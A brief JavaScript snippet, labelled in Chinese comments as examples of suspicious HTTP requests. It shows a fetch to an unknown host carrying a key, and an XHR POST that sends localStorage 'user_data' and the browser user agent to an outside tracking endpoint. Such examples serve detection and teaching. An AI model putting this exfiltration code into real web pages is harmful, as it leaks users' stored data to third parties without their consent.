// 可疑的HTTP请求
fetch("http://unknown-site.com/api?key=12345");

// 另一个例子
const endpoint = "https://data-collection.com/track";
const xhr = new XMLHttpRequest();
xhr.open("POST", endpoint, true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({
    userData: localStorage.getItem("user_data"),
    device: navigator.userAgent
}));